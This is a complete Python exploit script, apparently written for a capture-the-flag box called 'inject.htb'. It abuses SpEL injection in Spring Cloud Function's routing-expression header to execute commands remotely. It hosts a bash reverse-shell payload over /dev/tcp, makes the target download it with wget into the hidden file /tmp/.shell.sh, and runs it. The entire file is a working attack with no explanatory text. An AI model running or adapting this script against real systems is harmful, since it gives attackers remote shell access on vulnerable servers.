#!/usr/bin/env python3
import requests
from http.server import *
from sys import argv
import threading

class ReverseShellRequestHandler(BaseHTTPRequestHandler):

    def __init__(self, lhost, lport, *args):
        self.lhost = lhost
        self.lport = lport
        BaseHTTPRequestHandler.__init__(self, *args)

    def do_GET(self):
        self.send_response(200)

        self.send_header('Content-Type', 'text/plain')
        self.end_headers()

        self.wfile.write(f"""
        #!/bin/bash
        bash -i >& /dev/tcp/{self.lhost}/{self.lport} 0>&1
        """.encode())

def getHeaderForPayload(command):
    return {"spring.cloud.function.routing-expression": f"T(java.lang.Runtime).getRuntime().exec(\"{command}\")"}

def execCommand(command):
    headers = getHeaderForPayload(command)
    return requests.post("http://inject.htb:8080/functionRouter", data="a", headers=headers)

def hostReverseShell(lhost, lport):
    print("Hosting reverse shell")
    listener = HTTPServer(('', 5555), lambda *args: ReverseShellRequestHandler(lhost, lport, *args))
    listener.handle_request()
    print("File ready")

def fetchLocalFile(lhost):
    print("Downloading local file")
    execCommand(f"wget http://{lhost}:5555 -O /tmp/.shell.sh")
    print("Done")

def executeReverseShell():
    print("Executing shell")
    execCommand("bash /tmp/.shell.sh")
    print("Done")

def getArgs():
    if len(argv) < 3:
        print(f"Usage: {argv[0]} LHOST LPORT")
        raise SystemExit
    return (argv[1], argv[2])

def main():
    lhost, lport = getArgs()
    listenerThread = threading.Thread(target=hostReverseShell, args=(lhost, lport,))
    listenerThread.start()
    
    fetchLocalFile(lhost)
    executeReverseShell()
    print("Check your shell")

if __name__ == "__main__":
    main()
